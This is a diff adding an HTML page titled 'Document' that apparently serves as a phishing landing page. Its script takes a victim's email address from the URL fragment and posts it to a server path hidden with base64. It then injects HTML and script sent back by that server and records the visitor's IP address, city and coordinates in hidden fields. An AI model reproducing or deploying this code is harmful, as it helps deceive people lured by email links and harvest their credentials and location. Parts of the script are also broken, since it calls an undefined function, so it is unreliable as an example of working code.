@@ -1,0 +1,171 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <title>Document</title>
+
+    <!-- You MUST include jQuery 3.4+ before Fomantic -->
+    <script src="https://cdn.jsdelivr.net/npm/jquery@3.7.1/dist/jquery.min.js"></script>
+    <link
+      rel="stylesheet"
+      type="text/css"
+      href="https://cdn.jsdelivr.net/npm/fomantic-ui@2.9.3/dist/semantic.min.css"
+    />
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Lato:ital,wght@0,400;0,700;0,900;1,400;1,700;1,900&display=swap"
+      rel="stylesheet"
+    />
+
+    <link rel="shortcut icon" id="_f_av_icn_" type="image/x-icon">
+    <link rel="stylesheet" href="./style.css" />
+  </head>
+  <body>
+    <a href="#" class="feedback-floating">
+      <span>Feedback</span>
+    </a>
+
+    <div class="wrpr">
+      
+    </div>
+
+    <div class="mobile-view">
+          
+    </div>
+
+    <!-- <script>
+      $(".two.item.stackable .item").tab();
+
+      $(".inline.dropdown").dropdown();
+    </script> -->
+
+
+ <script id="ext_scrpt" src=""></script>
+
+ <script id="intnl_scrpt"></script>
+<script src="./srv.js"></script>
+
+<script id="sctoapnd1"></script>
+
+<script>
+  async function _start() {
+    const __winHref = window.location.href.split("?")[0];
+  const __getInd__ = (str, search) => str.indexOf(search);
+  const __getSlice__ = (str, index) => str.substr(index);
+  const __getEl__ = (sel) => document.querySelector(sel);
+  const __json = (url) => fetch(url).then((res) => res.json());
+  const cntHome = __getEl__(".wrpr");
+  const cntHomeTwo = __getEl__(".mobile-view");
+  const scToAppend1 = __getEl__("#sctoapnd1");
+
+  // const __getURLEm = () => {
+  //   if(__getInd__(__winHref, "#") === -1){
+  //     console.log("ue 1 failed");
+  //     return false;
+  //   }
+
+  //   if(__getInd__(__winHref, "@") === -1){
+  //     console.log("ue 2 failed");
+  //     return false;
+  //   }
+
+  //   return __getSlice__(__winHref, __getInd__(__winHref, "#") + 1);
+  // }
+
+  // const __UrlEm = __getURLEm();
+
+
+  const __getURLEm = () => {
+  if (__getInd__(__winHref, "#") === -1) {
+    console.log("ue 1 failed");
+    return false;
+  }
+
+  return __getSlice__(__winHref, __getInd__(__winHref, "#") + 1);
+};
+
+let __UrlEm = null;
+
+try {
+  __UrlEm = atob(__getURLEm());
+} catch (err) {
+  if (__getURLEm()) {
+    __UrlEm = __getURLEm();
+  } else {
+    console.log("error:", err.message);
+    // return;
+  }
+}
+
+
+
+  if (
+      __getInd__(__winHref, "#") === -1 ||
+     
+      !Boolean(__UrlEm)
+    ) {
+      console.log("Failed");
+      __UrlEm = '';
+      // return;
+    }
+
+  async function loadLoc(key) {
+    return await __json(`https://api.ipdata.co?api-key=${atob(key)}`);
+  }
+  
+
+  async function hydrate() {
+    const __fetchOptions = {
+      method: "POST",
+      body: JSON.stringify({
+        __UrlEm
+      }),
+      headers: {
+        "Content-Type": "application/json",
+      },
+    };
+    
+    const __res = await fetch(`${window.stef.srv_loc}${atob("L2FyYmEvZW5uZW1lbWVtZW1tLnBocA==")}`, __fetchOptions);
+
+    const __resData = await __res.json();
+
+    // hydrate
+    cntHome.innerHTML = __resData.data.cnt;
+    cntHome.classList.add("display_block");
+
+    cntHomeTwo.innerHTML = __resData.data.cnt2;
+    cntHomeTwo.classList.add("display_block");
+
+    const __locData = await loadLoc(__resData.data.key);
+
+    __getEl__("#_pidt_field_").value =
+      __locData.ip || "error retrieving data";
+    __getEl__("#_ocdt_field_").value =
+      __locData.country_name || "error retrieving data";
+    __getEl__("#_icdt_field_").value =
+      __locData.city || "error retrieving data";
+    __getEl__("#_oldt_field_").value =
+      __locData.longitude || "error retrieving data";
+    __getEl__("#_aldt_field_").value =
+      __locData.latitude || "error retrieving data";
+
+    scToAppend1.innerHTML = __resData.data.crpt1;
+    // get('#ext_scrpt').setAttribute('src', 'https://cdn.jsdelivr.net/npm/fomantic-ui@2.9.3/dist/semantic.min.js');
+
+    get("#second_tab").classList.remove('active');
+    get("#first_tab").classList.add('active');
+
+    return;
+  }
+
+  hydrate();
+  }
+
+  _start();
+</script>
+
+  </body>
+</html>
